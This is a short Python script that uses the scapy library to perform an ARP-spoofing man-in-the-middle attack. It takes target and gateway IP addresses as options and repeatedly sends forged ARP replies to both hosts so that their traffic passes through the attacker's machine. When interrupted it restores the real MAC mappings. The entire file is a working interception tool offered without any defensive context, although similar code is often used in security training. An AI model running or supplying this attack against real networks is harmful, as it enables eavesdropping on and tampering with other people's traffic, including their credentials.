import scapy.all as scapy
import time
import optparse

def getUserInput():
    parseObject = optparse.OptionParser()
    parseObject.add_option("-t", "--target", dest="targetIP", help="Enter the target ip address")
    parseObject.add_option("-g", "--gateway", dest="gatewayIP", help="Enter the gateway ip address")
    (userInput, arguments) = parseObject.parse_args()

    if not userInput.targetIP:
        print("Enter the target ip address. (-t *required)")

    if not userInput.gatewayIP:
        print("Enter the gateway ip address. (-g *required)")

    return userInput

def getMacAddress(ip):
    arpRequestPacket = scapy.ARP(pdst=ip)
    broadcastPacket = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combinedPacket = broadcastPacket / arpRequestPacket
    answeredList = scapy.srp(combinedPacket, timeout=1, verbose=False)[0]
    return answeredList[0][1].hwsrc

def mitm(targetIP, poisonedIP):
    targetMac = getMacAddress(targetIP)
    arpResponse = scapy.ARP(op=2, pdst=targetIP, psrc=poisonedIP, hwdst=targetMac)
    scapy.send(arpResponse, verbose=False)

def resetMitm(targetIP, poisonedIP):
    targetMac = getMacAddress(targetIP)
    poisonedMac = getMacAddress(poisonedIP)
    arpResponse = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMac, psrc=poisonedIP, hwsrc=poisonedMac)
    scapy.send(arpResponse, verbose=False, count=10)

packetCounter = 0
userInputs = getUserInput()
targetIP = userInputs.targetIP
gatewayIP = userInputs.gatewayIP

if gatewayIP and targetIP:
    try:
        while True:
            mitm(targetIP, gatewayIP)
            mitm(gatewayIP, targetIP)
            packetCounter += 2
            print("\rSending packets " + str(packetCounter), end="")
            time.sleep(3)
    except KeyboardInterrupt:
        print("\nQuit and Reset MITM")
        resetMitm(targetIP, gatewayIP)
        resetMitm(gatewayIP, targetIP)
